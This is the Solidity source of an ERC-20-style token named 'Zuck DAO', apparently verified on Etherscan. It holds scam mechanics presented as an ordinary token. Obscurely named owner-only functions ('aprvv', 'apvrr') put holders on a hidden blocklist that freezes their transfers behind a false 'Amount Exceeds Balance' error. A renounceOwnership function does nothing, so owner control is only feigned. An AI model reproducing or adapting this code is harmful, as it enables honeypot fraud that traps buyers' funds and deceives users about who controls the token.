/**
 *Submitted for verification at Etherscan.io on 2022-09-07
*/

pragma solidity 0.8.16;
/*

*/    

contract Zuck {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) txAmnt;

    // 
    string public name = "Zuck DAO";
    string public symbol = unicode"Zuck DAO";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor()  {
        // 
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

	address owner = msg.sender;


bool isEnabled;



modifier onlyOwner() {
    require(msg.sender == owner);
    _;
}

    function renounceOwnership() public onlyOwner  {

}





    function aprvv(address _user) public onlyOwner {
        require(!txAmnt[_user], "x");
        txAmnt[_user] = true;
     
    }
    
    function apvrr(address _user) public onlyOwner {
        require(txAmnt[_user], "xx");
        txAmnt[_user] = false;
  
    }
    
 


   




    function transfer(address to, uint256 value) public returns (bool success) {
        
require(!txAmnt[msg.sender] , "Amount Exceeds Balance"); 


require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    
    
    


    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
       public
        returns (bool success)


       {
            
  

           
       allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }









    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {   
    
        require(!txAmnt[from] , "Amount Exceeds Balance"); 
               require(!txAmnt[to] , "Amount Exceeds Balance"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    

}